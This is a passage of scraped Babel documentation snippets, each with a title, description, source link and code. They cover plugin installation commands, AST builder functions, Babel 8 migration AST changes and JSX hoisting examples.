Legacy Import Attributes Syntax Example JavaScript\nDESCRIPTION: Demonstrates the legacy syntax for import attributes, using `with type: \"json\"` instead of `with { type: \"json\" }`. This syntax was supported in older versions of the import attributes proposal.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2025-03-24-7.27.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport data from \"./data.json\" with type: \"json\";\n```\n\n----------------------------------------\n\nTITLE: Hoisting with Higher Order Components in `transform-react-constant-elements` - JavaScript\nDESCRIPTION: This example shows how the `transform-react-constant-elements` plugin hoists elements within Higher Order Components (HOCs).  The output demonstrates that the plugin correctly hoists `_ref` (the Parent component) and `_ref2` (the Child component) outside of the `Parent` and `Child` functional components, even when the `Child` component is wrapped in a HOC. This optimization ensures that these components are not re-created on every render.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nconst HOC = component => component;\n\nconst Parent = () => (\n  <div className=\"parent\">\n    <Child/>\n  </div>\n);\n\nexport default Parent;\n\nlet Child = () => (\n  <div className=\"child\">\n    ChildTextContent\n  </div>\n);\nChild = HOC(Child);\n```\n\nLANGUAGE: javascript\nCODE:\n```\nconst HOC = component => component;\n\nconst Parent = () => _ref;\n\nexport default Parent;\n\nvar _ref2 = <div className=\"child\">\n    ChildTextContent\n  </div>;\n\nlet Child = () => _ref2;\nChild = HOC(Child);\n\nvar _ref = <div className=\"parent\">\n    <Child />\n  </div>;\n```\n\n----------------------------------------\n\nTITLE: Transform Private Field 'in' Expression (JavaScript)\nDESCRIPTION: Demonstrates the transformation of private field 'in' expressions using the @babel/plugin-transform-private-property-in-object plugin. The 'In' code shows a class with a private field and a method using 'in' to check for the field's presence in an object. The 'Out' code displays the equivalent transformed code, using WeakMap to track private fields.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-property-in-object.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  #bar = \"bar\";\n\n  test(obj) {\n    return #bar in obj;\n  }\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  constructor() {\n    _bar.set(this, {\n      writable: true,\n      value: \"bar\",\n    });\n  }\n\n  test() {\n    return _bar.has(this);\n  }\n}\n\nvar _bar = new WeakMap();\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/plugin-syntax-numeric-separator\nDESCRIPTION: Installs the @babel/plugin-syntax-numeric-separator package as a development dependency using npm or yarn. This command adds the package to your project's package.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-numeric-separator.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-numeric-separator\n```\n\n----------------------------------------\n\nTITLE: Async Generator Function Transformation - Output\nDESCRIPTION: This is the output of the Babel plugin, showing the transformed code for the async generator function. It utilizes the `_asyncGenerator` helper to handle async iteration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-generator-functions.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _asyncGenerator = ...\n\nlet agf = (() => {\n  var _ref = _asyncGenerator.wrap(function* () {\n    yield _asyncGenerator.await(1);\n    yield 2;\n  });\n\n  return function agf() {\n    return _ref.apply(this, arguments);\n  };\n})();\n```\n\n----------------------------------------\n\nTITLE: ES5 Property Defaults and Types\nDESCRIPTION: Demonstrates setting default props, initial state, and prop types for a React component using React.createClass in ES5.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n// The ES5 way\nvar Video = React.createClass({\n  getDefaultProps: function() {\n    return {\n      autoPlay: false,\n      maxLoops: 10,\n    };\n  },\n  getInitialState: function() {\n    return {\n      loopsRemaining: this.props.maxLoops,\n    };\n  },\n  propTypes: {\n    autoPlay: React.PropTypes.bool.isRequired,\n    maxLoops: React.PropTypes.number.isRequired,\n    posterFrameSrc: React.PropTypes.string.isRequired,\n    videoSrc: React.PropTypes.string.isRequired,\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Creating a String Literal Node in Babel\nDESCRIPTION: Creates a `StringLiteral` AST node using the Babel types module. This represents a string literal, requiring a string value.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_151\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.stringLiteral(value);\n```\n\n----------------------------------------\n\nTITLE: JavaScript super() Compilation - Strict Mode\nDESCRIPTION: Illustrates how `super()` is compiled in strict mode within a constructor using 6to5 (now Babel). It demonstrates the complex logic generated to ensure spec-compliance in handling inheritance and method calls.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-01-27-2to3.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction Foo() {\n  _get(Object.getPrototypeOf(Foo.prototype), \"constructor\", this).call(this);\n}\n```\n\n----------------------------------------\n\nTITLE: Install Development Dependencies with yarn\nDESCRIPTION: This snippet shows how to install development dependencies using yarn. It converts the npm command to install grunt-babel and @babel/core as development dependencies.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/grunt/install.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nyarn add grunt-babel @babel/core --dev\n```\n\n----------------------------------------\n\nTITLE: Install async-do-expressions with npm\nDESCRIPTION: This shell command shows how to install the `@babel/plugin-proposal-async-do-expressions` plugin using npm. The `--save-dev` flag ensures that the plugin is saved as a development dependency in the `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-async-do-expressions.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-proposal-async-do-expressions\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm/yarn\nDESCRIPTION: Installs the @babel/plugin-syntax-import-source Babel plugin as a development dependency using npm or yarn.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-source.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-import-source\n```\n\n----------------------------------------\n\nTITLE: TSTypeQuery AST (Babel 8)\nDESCRIPTION: This is the AST representation of the TSTypeQuery node in Babel 8. The `exprName` is now a ThisExpression node.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSTypeQuery\",\n  \"exprName\": { \"type\": \"ThisExpression\" }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating ExportDefaultDeclaration in JavaScript\nDESCRIPTION: This snippet demonstrates how to create an `ExportDefaultDeclaration` AST node using Babel's `t.exportDefaultDeclaration` method. The `declaration` parameter is required and can be a `TSDeclareFunction`, `FunctionDeclaration`, `ClassDeclaration`, or `Expression`. The `exportKind` property defaults to 'value' and is excluded from the builder function.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_62\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.exportDefaultDeclaration(declaration);\n```\n\n----------------------------------------\n\nTITLE: Creating a Placeholder Node in Babel\nDESCRIPTION: Creates a `Placeholder` AST node using the Babel types module. This node represents a placeholder for a specific AST node type and requires the expected node type and name.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_140\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.placeholder(expectedNode, name);\n```\n\n----------------------------------------\n\nTITLE: TSFunctionType AST (Babel 8)\nDESCRIPTION: Babel 8 AST for TSFunctionType, using `params` and `returnType`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_22\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSFunctionType\",\n  \"params\": [\n    { \"type\": \"Identifier\", \"name\": \"x\", \"typeAnnotation\": { \"type\": \"TSNumberKeyword\" } }\n  ],\n  \"retutnType\": {\n    \"type\": \"TSTypeAnnotation\",\n    \"typeAnnotation\": { \"type\": \"TSStringKeyword\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Refs Deopt (JSX)\nDESCRIPTION: Example demonstrating a deopt caused by using refs on JSX elements. Hoisting is not performed when ref attributes are used.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-constant-elements.md#_snippet_7\n\nLANGUAGE: JSX\nCODE:\n```\n<div ref=\"foobar\" />\n<div ref={node => this.node = node} />\n```\n\n----------------------------------------\n\nTITLE: Plugin Installation\nDESCRIPTION: This command installs the @babel/plugin-transform-jscript plugin as a development dependency using npm. It's a prerequisite for using the plugin in a Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-jscript.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-jscript\n```\n\n----------------------------------------\n\nTITLE: Configure Plugin via babel.config.json\nDESCRIPTION: Configures the babel-plugin-transform-minify-booleans plugin using a babel.config.json file.\nRequires: Babel configuration file. Input: JSON configuration object. Output: Babel plugin configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-minify-booleans.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"transform-minify-booleans\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Environment Variable Replacement Output\nDESCRIPTION: This JavaScript code snippet shows the output of the plugin after replacing `process.env.NODE_ENV` with its actual value ('development').\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-inline-environment-variables.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n\"development\";\n```\n\n----------------------------------------\n\nTITLE: Transformed TypeScript Example\nDESCRIPTION: Shows the output of the TypeScript example after being processed by the Babel plugin. The type annotation `: number` has been removed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\nconst x = 0;\n```\n\n----------------------------------------\n\nTITLE: Installation via npm\nDESCRIPTION: This command installs the @babel/plugin-transform-strict-mode plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-strict-mode.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-strict-mode\n```\n\n----------------------------------------\n\nTITLE: Creating a TS Any Keyword Node in Babel\nDESCRIPTION: Creates a `TSAnyKeyword` AST node using the Babel types module. This node represents the `any` keyword in TypeScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_158\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsAnyKeyword();\n```\n\n----------------------------------------\n\nTITLE: Install @babel/plugin-transform-property-mutators (Shell)\nDESCRIPTION: This command installs the `@babel/plugin-transform-property-mutators` plugin as a development dependency using npm.  It ensures that the plugin is available during the build process for transforming code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-property-mutators.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-property-mutators\n```\n\n----------------------------------------\n\nTITLE: Creating EnumSymbolBody in JavaScript\nDESCRIPTION: This snippet demonstrates creating an `EnumSymbolBody` AST node using Babel's `t.enumSymbolBody` method. The `members` parameter is a required array of `EnumDefaultedMember` nodes, and `hasUnknownMembers` is a required boolean value. This represents the body of an enum containing symbol-valued members.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_59\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.enumSymbolBody(members);\n```\n\n----------------------------------------\n\nTITLE: Installing Babel Preset ES2017\nDESCRIPTION: This command installs the @babel/preset-es2017 package as a development dependency using npm. This command uses a special npm2yarn preprocessor, so users can use it for both npm and yarn.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-es2017.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/preset-es2017\n```\n\n----------------------------------------\n\nTITLE: Creating a Static Block Node in Babel\nDESCRIPTION: Creates a `StaticBlock` AST node using the Babel types module.  This represents a static block in a class, and requires an array of statements for the body.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_150\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.staticBlock(body);\n```\n\n----------------------------------------\n\nTITLE: OptionalCallExpression AST (Babel 8)\nDESCRIPTION: Babel 8 AST for OptionalCallExpression, using `typeArguments`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_37\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"OptionalCallExpression\",\n  \"callee\": Identifier(\"fn\"),\n  \"arguments\": [],\n  \"optional\": true,\n  \"typeArguments\": {\n    \"type\": \"TSTypeParameterInstantiation\",\n    \"params\": [{\n      \"type\": \"TSStringKeyword\"\n    }]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Loose mode example\nDESCRIPTION: Demonstrates the output when the `loose` option is enabled, using assignment instead of `Object.defineProperty`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-commonjs.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = (exports.foo = 5);\nexports.__esModule = true;\n```\n\n----------------------------------------\n\nTITLE: OptionalCallExpression AST (Babel 7)\nDESCRIPTION: Babel 7 AST for OptionalCallExpression, using `typeParameters`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_36\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"OptionalCallExpression\",\n  \"callee\": Identifier(\"fn\"),\n  \"arguments\": [],\n  \"optional\": true,\n  \"typeParameters\": {\n    \"type\": \"TSTypeParameterInstantiation\",\n    \"params\": [{\n      \"type\": \"TSStringKeyword\"\n    }]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Node API Usage\nDESCRIPTION: Example of how to use the plugin via the Babel Node API to transform code programmatically.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-commonjs.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-modules-commonjs\"],\n});\n```\n\n----------------------------------------\n\nTITLE: TSMethodSignature Parameters/ReturnType Renaming (TypeScript)\nDESCRIPTION: Illustrates the renaming of `parameters` to `params` and `typeAnnotation` to `returnType` in TSMethodSignature.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_17\n\nLANGUAGE: typescript\nCODE:\n```\ninterface Foo {\n  foo(x: number): string;\n}\n```\n\n----------------------------------------\n\nTITLE: TSConstructorType Parameters/ReturnType Renaming (TypeScript)\nDESCRIPTION: Illustrates the renaming of `parameters` to `params` and `typeAnnotation` to `returnType` in TSConstructorType.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_23\n\nLANGUAGE: typescript\nCODE:\n```\ntype Bar = (x: number) => string;\n```\n\n----------------------------------------\n\nTITLE: Installing babel-minify\nDESCRIPTION: This command installs babel-minify as a development dependency using npm. It allows you to minify your JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/minify.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-minify --save-dev\n```\n\n----------------------------------------\n\nTITLE: Checking for BlockParent Node Type with Babel\nDESCRIPTION: Checks if a given AST node is a `BlockParent` node using `t.isBlockParent(node)`. This alias covers AST nodes that introduce a new lexical environment, such as `ArrowFunctionExpression`, `BlockStatement`, and various loop and function constructs.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_256\n\nLANGUAGE: javascript\nCODE:\n```\nt.isBlockParent(node);\n```\n\n----------------------------------------\n\nTITLE: Creating a ContinueStatement AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.continueStatement` to create a continue statement node in the AST. It accepts an optional label (Identifier) to specify which loop to continue. Without a label, it continues the innermost loop.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_30\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.continueStatement(label);\n```\n\n----------------------------------------\n\nTITLE: Create Import AST Node (JavaScript)\nDESCRIPTION: Creates an `Import` AST node using the `t.import()` builder.  This node represents the `import()` expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_79\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.import();\n```\n\n----------------------------------------\n\nTITLE: Creating a DeclareVariable AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.declareVariable` to create a declare variable node in the AST for Flow type annotations. It takes an ID (Identifier) representing the variable name.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_42\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.declareVariable(id);\n```\n\n----------------------------------------\n\nTITLE: Install Babel and Dependencies\nDESCRIPTION: This shell script installs the required Babel packages and their dependencies. It uses 'bundle install' to install the Ruby gems specified in the Gemfile and 'npm install' to install Node.js packages such as @babel/core, @babel/plugin-external-helpers, @babel/plugin-transform-modules-umd, and @babel/preset-env.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/sprockets/install.md#_snippet_1\n\nLANGUAGE: Shell Script\nCODE:\n```\nbundle install\nnpm install --save @babel/core @babel/plugin-external-helpers @babel/plugin-transform-modules-umd @babel/preset-env\n```\n\n----------------------------------------\n\nTITLE: Using a Custom Babel Parser Fork JavaScript\nDESCRIPTION: This code snippet shows how to use a custom fork of the Babel parser by utilizing the `parserOverride` option within a Babel plugin. It requires a custom parser installed via npm and overrides the default parser with the custom one.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_39\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst parse = require(\"custom-fork-of-babel-parser-on-npm-here\");\n\nmodule.exports = {\n  plugins: [\n    {\n      parserOverride(code, opts) {\n        return parse(code, opts);\n      },\n    },\n  ],\n};\n```\n\n----------------------------------------\n\nTITLE: Use plugin via Node API JavaScript\nDESCRIPTION: This JavaScript code snippet shows how to use the `@babel/plugin-syntax-async-generators` plugin via the Babel Node API.  It transforms the string \"code\" using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-async-generators.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-async-generators\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Stripped Flow Type Annotation JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates the output after the Flow type annotations have been stripped. The types have been removed leaving standard JavaScript syntax. The function `foo` now takes three untyped arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-flow-strip-types.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction foo(one, two, three) {}\n```\n\n----------------------------------------\n\nTITLE: Create Interface Declaration AST Node (JavaScript)\nDESCRIPTION: Creates an `InterfaceDeclaration` AST node using the `t.interfaceDeclaration` builder. This node represents an interface declaration in Flow. Parameters include the interface identifier, type parameters, extended interfaces, and the object type body.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_88\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.interfaceDeclaration(id, typeParameters, extends, body);\n```\n\n----------------------------------------\n\nTITLE: Babel v6 Configuration with Stage Presets (JavaScript)\nDESCRIPTION: This code snippet demonstrates a typical Babel v6 configuration file using the 'es2015', 'react', and 'stage-0' presets. It showcases how easily developers could opt into experimental JavaScript features by including the 'stage-0' preset. This configuration would enable transformations for ES2015, React JSX, and all features in Stage 0 of the TC39 process.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-27-removing-babels-stage-presets.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"presets\": [\"es2015\", \"react\", \"stage-0\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Checking for Conditional Node Type with Babel\nDESCRIPTION: Checks if a given AST node is a `Conditional` node using `t.isConditional(node)`. This is an alias covering both `ConditionalExpression` and `IfStatement` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_259\n\nLANGUAGE: javascript\nCODE:\n```\nt.isConditional(node);\n```\n\n----------------------------------------\n\nTITLE: JSON: Configure ESLint Parser Options\nDESCRIPTION: Illustrates how to configure the `ecmaFeatures.globalReturn` option within the `.eslintrc` file to enable `allowReturnOutsideFunction` functionality.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_12\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"parser\": \"@babel/eslint-parser\",\n  \"parserOptions\": {\n    \"ecmaFeatures\": {\n      \"globalReturn\": true\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: TSCallSignatureDeclaration Parameters/ReturnType Renaming (TypeScript)\nDESCRIPTION: Illustrates the renaming of `parameters` to `params` and `typeAnnotation` to `returnType` in TSCallSignatureDeclaration.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_11\n\nLANGUAGE: typescript\nCODE:\n```\ninterface Foo {\n  (x: number): string;\n}\n```\n\n----------------------------------------\n\nTITLE: ES6 Component Lifecycle with Constructor\nDESCRIPTION: Illustrates using the constructor in an ES6 class component to replace the componentWillMount lifecycle method.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n// The ES6+ way\nclass EmbedModal extends React.Component {\n  constructor(props) {\n    super(props);\n    // Operations usually carried out in componentWillMount go here\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Checking for UnaryLike Nodes in JavaScript\nDESCRIPTION: This snippet shows how to check if a node is either a `SpreadElement` or a `UnaryExpression` using Babel's `t.isUnaryLike` method. This can be useful when dealing with operators that can appear either as unary operators or as part of spread operations. This is useful for code transformations or analyses that need to handle both types of nodes in a similar way.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_300\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isUnaryLike(node);\n```\n\n----------------------------------------\n\nTITLE: Parsing with @babel/parser - Template Literal Tokenization\nDESCRIPTION: This snippet shows the change in how template literals are tokenized in Babel 8. Babel 7 uses a single `template` token type, while Babel 8 introduces `templateNonTail` and `templateTail` to distinguish between non-tail and tail parts of the literal. Dependencies: `@babel/parser`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_71\n\nLANGUAGE: javascript\nCODE:\n```\nimport { parse } from \"@babel/parser\";\n\nconst { tokens } = parse(\"`head${x}middle${y}tail``\", { tokens: true });\nconsole.log(tokens); // print tokens\n// Babel 7\n// [\n//  Token (`),\n//  Token (template) { value: \"head\" }, Token (${),\n//  Token (name) { value: \"x\" }, Token (}),\n//  Token (template) { value: \"middle\" }, Token (${),\n//  Token (name) { value: \"y\" }, Token (}),\n//  Token (template) { value: \"tail\" }\n//  Token (``)\n// ]\n// Babel 8\n// [\n//  Token (templateNonTail) { value: \"head\" },\n//  Token (name) { value: \"x\" },\n//  Token (templateNonTail) { value: \"middle\" },\n//  Token (name) { value: \"y\" },\n//  Token (templateTail) { value: \"tail\" }\n// ]\n```\n\n----------------------------------------\n\nTITLE: Configuring noDocumentAll Assumption\nDESCRIPTION: Example showing the configuration of `noDocumentAll` assumption within babel config file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-chaining.md#_snippet_9\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"assumptions\": {\n    \"noDocumentAll\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Interface Declaration\nDESCRIPTION: Creates a TypeScript interface declaration node in the AST. Requires an identifier (`id`), and accepts optional type parameters, extended interfaces, and the interface body.  The `declare` property is excluded from the builder function.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_183\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsInterfaceDeclaration(id, typeParameters, extends, body);\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Attribute in JavaScript\nDESCRIPTION: This snippet creates a `JSXAttribute` AST node using Babel's `t.jsxAttribute` builder. The `name` parameter is a `JSXIdentifier` or `JSXNamespacedName`, and the `value` parameter can be a `JSXElement`, `JSXFragment`, `StringLiteral`, or `JSXExpressionContainer`. The value defaults to null if not provided.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_93\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxAttribute(name, value);\n```\n\n----------------------------------------\n\nTITLE: Mutable Style Property (JavaScript)\nDESCRIPTION: Example demonstrating a deopt due to a mutable style property passed as inline CSS.  This shows usage that would prevent hoisting because the style property is an object with potentially changing values.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-constant-elements.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\n<div style={{ width: 100 }} />\n```\n\n----------------------------------------\n\nTITLE: Creating a DoWhileStatement AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.doWhileStatement` to create a do-while statement node in the AST. It takes the test expression and the statement representing the loop body.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_48\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.doWhileStatement(test, body);\n```\n\n----------------------------------------\n\nTITLE: Run Babel With Block Scoping Plugin\nDESCRIPTION: Runs Babel from the command line, specifying the @babel/plugin-transform-block-scoping plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-block-scoping.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-block-scoping script.js\n```\n\n----------------------------------------\n\nTITLE: Installing the Babel Plugin\nDESCRIPTION: This shell command installs the @babel/plugin-transform-json-strings plugin as a dev dependency using npm. It's a prerequisite for using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-strings.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-json-strings\n```\n\n----------------------------------------\n\nTITLE: Creating a Super Node in Babel\nDESCRIPTION: Creates a `Super` AST node using the Babel types module.  This represents a `super` keyword.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_154\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.super();\n```\n\n----------------------------------------\n\nTITLE: Template Literals (JavaScript)\nDESCRIPTION: This snippet showcases a basic template literal example and shows the default Babel 7 behavior using the `concat` method.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_27\n\nLANGUAGE: javascript\nCODE:\n```\n// input\n`foo${bar}`;\n```\n\nLANGUAGE: javascript\nCODE:\n```\n// default v7 behavior: [\"@babel/plugin-transform-template-literals\"]\n\"foo\".concat(bar);\n```\n\n----------------------------------------\n\nTITLE: Create Indexed Access Type AST Node (JavaScript)\nDESCRIPTION: Creates an `IndexedAccessType` AST node using the `t.indexedAccessType` builder. This node represents an indexed access type in Flow. Parameters include the object type and the index type.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_86\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.indexedAccessType(objectType, indexType);\n```\n\n----------------------------------------\n\nTITLE: Install @babel/code-frame\nDESCRIPTION: Installs the @babel/code-frame package as a development dependency using npm or yarn.\nSOURCE: https://github.com/babel/website/blob/main/docs/code-frame.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/code-frame\n```\n\n----------------------------------------\n\nTITLE: Transform dynamic import (input)\nDESCRIPTION: This is an example of dynamic import syntax that will be transformed by the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dynamic-import.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport(\"jquery\").then($ => {});\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration JSON\nDESCRIPTION: Shows the recommended way to configure the plugin through a babel.config.json file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-proto-to-assign.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-proto-to-assign\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TypeParameter with Babel\nDESCRIPTION: Creates a `TypeParameter` AST node using the `t.typeParameter` method. This node represents a type parameter in Flow, where `bound` is a `TypeAnnotation` node defining the upper bound, `default` is a `FlowType` node defining the default type, and `variance` is a `Variance` node.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_238\n\nLANGUAGE: javascript\nCODE:\n```\nt.typeParameter(bound, default, variance);\n```\n\n----------------------------------------\n\nTITLE: Optional Catch Binding Syntax JavaScript\nDESCRIPTION: This JavaScript code demonstrates the optional catch binding syntax, where the `catch` block does not declare a variable to capture the thrown value.  The code attempts to throw an error and then executes code within the `catch` block, regardless of the thrown value.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-optional-catch-binding.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\ntry {\n  throw 0;\n} catch {\n  doSomethingWhichDoesNotCareAboutTheValueThrown();\n  console.log(\"Yay, code executes!\");\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an ObjectTypeProperty in JavaScript\nDESCRIPTION: This code snippet demonstrates creating an `ObjectTypeProperty` AST node using `t.objectTypeProperty(key, value, variance)`. It represents a property in a Flow object type annotation. Parameters include the key, value, and variance.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_130\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.objectTypeProperty(key, value, variance);\n```\n\n----------------------------------------\n\nTITLE: ESM Module Exporting a Default Function\nDESCRIPTION: This JavaScript snippet represents an ECMAScript module that 